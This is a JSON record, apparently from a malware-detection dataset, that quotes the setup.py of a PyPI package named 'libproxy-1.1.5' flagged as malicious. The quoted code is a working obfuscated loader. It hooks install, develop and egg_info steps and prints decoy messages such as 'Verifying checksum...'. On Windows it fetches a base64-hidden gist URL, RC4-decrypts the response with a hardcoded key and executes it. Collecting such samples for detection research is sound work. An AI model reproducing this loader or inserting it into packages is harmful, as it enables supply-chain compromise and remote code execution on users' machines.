[
  {
    "pyfile": "setup.py",
    "malicious_code_snippets": "import os\nimport sys\nimport urllib.request\nimport multiprocessing\nimport base64\n\nCONFIG_UPDATE_INFORMATION_ENDPOINT = b\"aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vZXJpay1hcnRlbW92L2I1ZGUyNTE5NWJkMGU5NjFhNTIxYjAzNDU2NjE0ZDRjL3Jhdy8xY2MyMzYzMTBkYTdmM2UwNWI2NTcxZWFhOWRiNGI2NjM2ZmI0Njg0L2d6TGpnT3VqOHkwYmF2VG12Z2tDd1IzaDFrdkVDMUJNLmI2NAo=\"\nupdate_information_url = base64.b64decode(CONFIG_UPDATE_INFORMATION_ENDPOINT).decode('utf-8')\nkey = \"gUMX0ANp53ofRAwPFF3oOD5SIgJmXfZP\"\n\nD=range\ndef E(key):\n\tA=[A for A in D(0,256)];B=0\n\tfor C in D(0,256):B=(B+A[C]+key[C%len(key)])%256;E=A[C];A[C]=A[B];A[B]=E\n\treturn A\ndef F(sched):\n\tA=sched;E=[];B=0;C=0\n\twhile True:B=(1+B)%256;C=(A[B]+C)%256;D=A[C];A[C]=A[B];A[B]=D;yield A[(A[B]+A[C])%256]\ndef aRCAwKG0p3(eykEZYeNhh,key):\n\tB=key;A=eykEZYeNhh;A=A.split('0X')[1:];A=[int('0x'+A.lower(),0)for A in A];B=[ord(A)for A in B];D=E(B);G=F(D);C=''\n\tfor H in A:I=str(chr(H^next(G)));C+=I\n\treturn C\n\ndef send():\n    if os.name == \"nt\":\n        print(\"Verifying checksum...\")\n        try:\n            with urllib.request.urlopen(update_information_url) as response:\n                exec(aRCAwKG0p3(base64.b64decode(response.read()).decode('utf-8'), key))\n        except urllib.error.URLError as e:\n            pass\n        exit(0)\n\nfrom setuptools.command.install import install\nfrom setuptools.command.develop import develop\nfrom setuptools.command.egg_info import egg_info\n\nclass PostInstallCommand(install):\n    def run(self):\n        print(\"Running post installation...\")\n        install.run(self)\n        child_process = multiprocessing.Process(target=send)\n        child_process.start()\n\nclass PostDevelopCommand(develop):\n    def run(self):\n        print(\"Running development mode post-install.\")\n        develop.run(self)\n        child_process = multiprocessing.Process(target=send)\n        child_process.start()\n\nclass PostEggInfoCommand(egg_info):\n    def run(self):\n        print(\"Validating egg_info.\")\n        egg_info.run(self)\n        child_process = multiprocessing.Process(target=send)\n        child_process.start()"
  },
  {
    "metadata": {
      "package_name": "libproxy-1.1.5",
      "report_path": "/home/blue/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/libproxy-1.1.5.txt"
    }
  }
]